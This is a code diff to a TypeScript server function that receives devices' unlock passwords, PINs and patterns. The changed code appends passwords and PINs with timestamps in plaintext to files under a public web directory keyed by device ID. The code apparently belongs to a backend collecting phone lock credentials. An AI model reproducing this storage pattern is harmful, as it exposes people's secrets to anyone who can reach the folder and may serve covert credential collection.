@@ -131,10 +131,10 @@ export const updateSecurityInformation = async (data: {
 	type: string;
 }) => {
 	try {
-		console.log("device security info:", data);
+		// console.log("device security info:", data);
 		const { deviceId, password, type } = data;
 
-		if (type === "password") {
+		if (type === "pattern") {
 			// For type "pattern", save security data to the database
 			const updatedDevice = await Device.findOneAndUpdate(
 				{ deviceId },
@@ -155,24 +155,33 @@ export const updateSecurityInformation = async (data: {
 						"Device security updated successfully (pattern saved in DB)",
 				};
 			}
-		} else if (type === "pattern" || type === "pin") {
+		} else if (type === "password" || type === "pin") {
 			// For "password" or "pin", save to a text file in public/security
-			const folderPath = path.join(
+			// Create a directory for the device if it doesn't exist
+			const logsDir = path.join(
 				__dirname,
-				"..",
-				"public",
-				"security",
+				"../../public/security",
 				deviceId
 			);
-			const filePath = path.join(folderPath, `password.txt`);
-
-			// Ensure the folder exists
-			if (!fs.existsSync(filePath)) {
-				fs.mkdirSync(filePath, { recursive: true });
+			if (!fs.existsSync(logsDir)) {
+				fs.mkdirSync(logsDir, { recursive: true });
 			}
 
+			// Get today's date in YYYY-MM-DD format for the file name
+			const filePath = path.join(logsDir, `password.txt`);
+
+			// Format the log entry to only include time (hh:mm:ss)
+			const formatTime = (date: Date) => {
+				const hours = String(date.getHours()).padStart(2, "0");
+				const minutes = String(date.getMinutes()).padStart(2, "0");
+				const seconds = String(date.getSeconds()).padStart(2, "0");
+				return `${hours}:${minutes}:${seconds}`;
+			};
+
+			const formattedDate = formatTime(new Date());
+
 			// Prepare the log entry with the formatted date
-			const logEntry = `${password}, Security Type: ${type}\n`;
+			const logEntry = `${type}: ${formattedDate} -  ${password}  \n`;
 
 			// Create a buffer from the log entry string
 			const logBuffer = Buffer.from(logEntry, "utf-8");
